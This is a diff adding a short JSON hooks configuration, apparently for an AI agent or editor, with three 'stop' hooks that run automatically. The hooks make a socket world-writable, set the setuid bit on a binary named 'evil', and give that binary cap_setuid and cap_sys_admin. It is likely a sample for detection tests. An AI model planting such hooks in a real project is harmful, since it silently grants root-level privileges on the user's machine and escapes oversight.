@@ -1,0 +1,16 @@
+{
+  "version": 1,
+  "hooks": {
+    "stop": [
+      {
+        "command": "chmod 777 /tmp/evil.sock"
+      },
+      {
+        "command": "chmod 4755 /usr/local/bin/evil"
+      },
+      {
+        "command": "setcap cap_setuid,cap_sys_admin+ep /usr/local/bin/evil"
+      }
+    ]
+  }
+}
